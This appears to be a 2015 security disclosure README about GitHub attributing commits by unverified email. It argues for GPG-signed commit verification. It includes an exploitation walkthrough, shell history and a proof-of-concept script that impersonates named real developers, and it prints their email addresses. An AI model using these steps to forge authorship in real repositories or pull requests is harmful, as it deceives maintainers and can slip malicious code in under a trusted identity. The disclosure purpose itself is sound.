Git Commit Fraud
================

Severity: **_Ineligible / Known Issue_**

Requirements: **_Github Account_**

Recommendation: **_Optional - GPG Commit Log Authentication Feature_**

Note: **_I am not the first person to notice this issue_**


Github's source control servers implicitly trust email metadata inside the commit log. Github uses the email address associated with commits to do a lookup against current github users. If that email is associated with a github user, that user is displayed as the commit author on github in the commit history. Github lacks commit level identity authentication, which would allow a malicious user to impersonate other Github users. Using a spoofed git client configuration an attacker can commit and push code appearing to be authored by another github user. This is done by configuring the user.email attribute:

```bash
git config --global user.email "chris@ozmm.org"
```
 
 The malicious user would then create a git repository, write some arbitrary code, add the code to the repository, commit the code, and then finally push the code to github's servers. The malicious commit when observed in github, seems to be authored by the spoofed user's account.

An example of this kind of git commit fraud can be seen in this demo repository:

* https://github.com/f47h3r/gitfraud/
* https://github.com/f47h3r/gitfraud/commits/master


--

This type of impersonation is not unique to newly created repositories either. Another vector for attack, might fork a public repo, make changes to their local repository while spoofing a contributor's email of the parent repo, and then sends a pull request with the arbitrary code to be accepted to the parent repository. A repository owner or contributor with merge permissions may mistakenly merge the fraudulently committed code thinking it is authored by a legitimate contributor, when it is indeed from an attacker's malicious fork.

Examples of a spoofed commit in a pull request can be found here:

* https://github.com/droptables/tornado-demo/pull/1
* https://github.com/droptables/tornado-demo/pull/2

Notice that the author of the code in the pull request is spoofed to be the droptables user.

* https://github.com/f47h3r/tornado-demo/commit/299c0aa9e48538dd38e7569fe8f2469437e3e105


Known Issue:
------------

Github has identified this as an ineligible vulnerability on their bug bounty site.

> Because Git is a distributed version control system, GitHub must use the commit email address to assign attribution. When you push a repository to GitHub.com it may contain one or more commits, some of which you may not have authored. For example, imagine a scenario where you collaborated with a number of people on a git repository before you made your first push of that repository to GitHub.com. This push would contain a number of commits from several authors. It would be incorrect to assign all of the commits to the person doing the push, so we use the commit log email addresses to assign attribution on GitHub.com. Each subsequent push to GitHub uses this same logic to assign attribution of commit authors.


* https://bounty.github.com/ineligible.html

Github is right here, git is a distributed source control system, there may be users in the commit log that are not on github and those that are. They use the git commit log email data to attribute github users. The fact that they bind data to a particular github user from the commit log, without authenticating it in any way is why some people might consider this a security issue. It used to be that there was no way to authenticate particular users using a signature of some kind. However in light of signed commits now being available for some time, it might be a good time to re-investigate this functionality. 

Recommendation / Feature Request:
---------------------------------

Add support for GPG Public Key - Commit Log Authentication to Github. The ability to optionally sign commits has been available since Git v1.7.9. having this type of feature would be nice addition in support Secure Development Life Cycle(SDLC) programs.

* http://git.kernel.org/cgit/git/git.git/plain/Documentation/RelNotes/1.7.9.txt?id=HEAD

This would require Github creating new (optional?) feature where gpg public keys could be uploaded to Github, in a similar manner to uploading ssh keys. Github would then be able to use those gpg public keys to authenticate git commits against users with submitted GPG public keys. Github could even jazz it up with a "social coding" twist -- think about it as having a "Verified" badge similar to twitter, just instead of verifying accounts, it would authenticate individual commits -- "Verfied Commits" for commits with good signatures.

If Github properly verified signatures on commits, before associating a Github user to the commit, it would potentially prevent unauthentic commits to be attributed to arbitrary github users. 


Process for Impersonating Github users:
---------------------------------------

https://github.com/torvalds

https://api.github.com/users/torvalds/events/public

**_Search for Email Attribute_**

torvalds@linux-foundation.org

git config --global user.email "torvalds@linux-foundation.org"

**_write file,  git add, git commit, git push_**

--

https://github.com/hmoore-r7

https://api.github.com/users/hmoore-r7/events/public

**_Search for Email Attribute_**

hd_moore@rapid7.com

git config --global user.email "hd_moore@rapid7.com"

**_write file,  git add, git commit, git push_**

--

https://github.com/defunkt

https://api.github.com/users/defunkt/events/public

**_Search for Email Attribute_**

chris@ozmm.org

git config --global user.email "chris@ozmm.org"

**_write file,  git add, git commit, git push_**

--

Process of Exploitation:
-----------------------------------

1. Setup new github repository.
2. Find someone's account username you'd like to commit code as.
3. Use the github API to reveal the email address associated with their account.
4. Set the git user.email attribute to email address of the account you wish to impersonate.
5. Write files, code, statements, you name it. Git add them to the repo.
6. Do a git commit, write a commit statement.
7. Do a git push to the repository.
8. Check github repository, and commit history. Code appears to be committed as the impersonated account.



Command History:


```bash

mkdir gitcommitfraud
cd gitcommitfraud
ls
git config --global user.email "noah.corradin@gmail.com"
ls
git init
touch commitFraudExample.md
vim commitFraudExample.md
git remote add origin git@github.com:f47h3r/gitfraud.git
git push -u origin master
git commit -a
git add .
git commit -a
git push -u origin master
git config --global user.email "royal.r4stl1n@gmail.com"
ls
touch r4stl1n-commiter.md
vim r4stl1n-commiter.md
git add .
git commit -a
git push
git config --global user.email "torvalds@linux-foundation.org"
vim linus-commit.md
git add .
git commit -a
git push
git config --global user.email "hd_moore@rapid7.com"
vim hd_wuz_here.txt
git add .
git commit -a
git push
git config --global user.email "chris@ozmm.org"
vim defunkt_wuz_here.md
git add .
git commit -a
git push

```

Output of git log:
```bash
commit 7bb80202e44105b73ce4fbff6803c09c93d10868
Author: f47h3r <chris@ozmm.org>
Date:   Sat Feb 21 18:20:09 2015 -0800

    defunkt in the house!

commit ab355301e99ab669499f6116b8e8a553e49d2ba0
Author: f47h3r <hd_moore@rapid7.com>
Date:   Sat Feb 21 18:14:35 2015 -0800

    hdm ... *wishing metasploit was in python*

commit da929b2e18e37db01b2be9c092bdf148d992b2d7
Author: f47h3r <torvalds@linux-foundation.org>
Date:   Sat Feb 21 17:28:29 2015 -0800

    Linus commits like a boss

commit 967bd0aca7c519890c009cd4b0e29dcd56306690
Author: f47h3r <royal.r4stl1n@gmail.com>
Date:   Sat Feb 21 17:20:52 2015 -0800

    r4stl1n be commitin'

commit f7848534f13088d2f5b9ff5c7cdcb1a29ab9953e
Author: f47h3r <noah.corradin@gmail.com>
Date:   Sat Feb 21 17:04:36 2015 -0800

    committing git fraud
(END)
```

Proof Of Concept Exploit Script:
-------------------------------

```bash
#!/bin/sh

# #################################
# Github Commit Fraud PoC Exploit #
# #################################
#
#  Step 1: Create a new github repository -- https://github.com/new
#  Step 2: Use this script with the ssh git clone url provided after creating a new repository.
#  Step 3: Check the new repository on github. Observe the Authors in the Commit History.
#
##  Usage: github_commit_fraud.sh <github_repo>
#
##  Example Usage: github_commit_fraud.sh git@github.com:f47h3r/git_commit_fraud_poc.git
#
#
#

mkdir git_commit_fraud_poc
cd git_commit_fraud_poc
ls
git config --global user.email "torvalds@linux-foundation.org"
git init
echo "Linus wuz here..." > hello_linus.md
git add .
git commit -m "Linus commits like a boss"
git remote add origin $1
git push -u origin master
git config --global user.email "hd_moore@rapid7.com"
echo "hdm wuz here..." > hd_wuz_here.md
git add .
git commit -m "*wishes metasploit was written in python*"
git push
git config --global user.email "chris@ozmm.org"
echo "defunkt wuz here" > defunkt_wuz_here.md
git add .
git commit -m "defunkt in da house!"
git push
```

Output of PoC Exploit:

```bash
-> % ./github_commit_fraud.sh git@github.com:f47h3r/git_commit_fraud_poc.git
Initialized empty Git repository in /Users/schultzc/Personal/Research/gitcommitfraud/git_commit_fraud_poc/.git/
[master (root-commit) 85d38ce] Linus commits like a boss
 1 file changed, 1 insertion(+)
 create mode 100644 hello_linus.md
Counting objects: 3, done.
Writing objects: 100% (3/3), 250 bytes | 0 bytes/s, done.
Total 3 (delta 0), reused 0 (delta 0)
To git@github.com:f47h3r/git_commit_fraud_poc.git
 * [new branch]      master -> master
Branch master set up to track remote branch master from origin.
[master cca007f] *wishes metasploit was written in python*
 1 file changed, 1 insertion(+)
 create mode 100644 hd_wuz_here.md
Counting objects: 4, done.
Delta compression using up to 4 threads.
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 319 bytes | 0 bytes/s, done.
Total 3 (delta 0), reused 0 (delta 0)
To git@github.com:f47h3r/git_commit_fraud_poc.git
   85d38ce..cca007f  master -> master
[master 928f5ce] defunkt in da house!
 1 file changed, 1 insertion(+)
 create mode 100644 defunkt_wuz_here.md
Counting objects: 4, done.
Delta compression using up to 4 threads.
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 332 bytes | 0 bytes/s, done.
Total 3 (delta 0), reused 0 (delta 0)
To git@github.com:f47h3r/git_commit_fraud_poc.git
   cca007f..928f5ce  master -> master
```


* https://github.com/f47h3r/git_commit_fraud_poc
* https://github.com/f47h3r/git_commit_fraud_poc/blob/master/defunkt_wuz_here.md
* https://github.com/f47h3r/git_commit_fraud_poc/blob/master/hd_wuz_here.md
* https://github.com/f47h3r/git_commit_fraud_poc/blob/master/hello_linus.md


--

Example of Github Repo, with exploited commits:

* https://github.com/f47h3r/gitfraud/
* https://github.com/f47h3r/gitfraud/commits/master

Useful References:

How to find any github user's email address:

* http://www.sourcecon.com/news/2014/02/06/how-to-find-almost-any-github-users-email-address/

GPG Sign Your Git Commits:

* https://ariejan.net/2014/06/04/gpg-sign-your-git-commits/

A Git Horror Story: Repository Integrity With Signed Commits

* http://mikegerwitz.com/papers/git-horror-story

Previous Discussion of this issue:

* https://gluxon.com/blog/2014/05/23/Why-does-GitHub-let-me-commit-as-other-people
* https://news.ycombinator.com/item?id=6918343
* http://www.jayhuang.org/blog/tag/impersonating/
* https://news.ycombinator.com/item?id=6918343

